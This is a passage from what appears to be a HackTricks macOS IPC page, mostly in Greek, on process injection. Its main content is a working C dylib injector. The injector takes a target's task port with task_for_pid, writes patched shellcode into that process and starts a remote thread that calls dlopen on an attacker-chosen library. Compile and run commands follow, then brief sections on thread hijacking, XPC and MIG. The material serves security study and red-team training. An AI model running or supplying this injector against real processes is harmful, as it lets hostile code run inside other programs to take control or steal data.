"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Thread Hijacking via Task port <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

Σε αυτή την τεχνική, ένα νήμα της διαδικασίας καταλαμβάνεται:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md" %}
[macos-thread-injection-via-task-port.md](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md)
{% endcontent-ref %}

## XPC

### Basic Information

Το XPC, που σημαίνει XNU (ο πυρήνας που χρησιμοποιείται από το macOS) inter-Process Communication, είναι ένα πλαίσιο για **επικοινωνία μεταξύ διαδικασιών** στο macOS και το iOS. Το XPC παρέχει έναν μηχανισμό για την πραγματοποίηση **ασφαλών, ασύγχρονων κλήσεων μεθόδων μεταξύ διαφορετικών διαδικασιών** στο σύστημα. Είναι μέρος της ασφάλειας της Apple, επιτρέποντας τη **δημιουργία εφαρμογών με διαχωρισμένα δικαιώματα** όπου κάθε **συστατικό** εκτελείται με **μόνο τα δικαιώματα που χρειάζεται** για να κάνει τη δουλειά του, περιορίζοντας έτσι τη δυνητική ζημιά από μια συμβιβασμένη διαδικασία.

Για περισσότερες πληροφορίες σχετικά με το πώς αυτή η **επικοινωνία λειτουργεί** και πώς θα μπορούσε να είναι ευάλωτη, ελέγξτε:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/" %}
[macos-xpc](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/)
{% endcontent-ref %}

## MIG - Mach Interface Generator

Το MIG δημιουργήθηκε για να **απλοποιήσει τη διαδικασία δημιουργίας κώδικα Mach IPC**. Βασικά **παράγει τον απαραίτητο κώδικα** για τον διακομιστή και τον πελάτη ώστε να επικοινωνούν με μια δεδομένη ορισμό. Ακόμα και αν ο παραγόμενος κώδικας είναι άσχημος, ένας προγραμματιστής θα χρειαστεί απλώς να τον εισάγει και ο κώδικάς του θα είναι πολύ πιο απλός από πριν.

Για περισσότερες πληροφορίες, ελέγξτε:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-mig-mach-interface-generator.md" %}
[macos-mig-mach-interface-generator.md](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-mig-mach-interface-generator.md)
{% endcontent-ref %}

## References

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
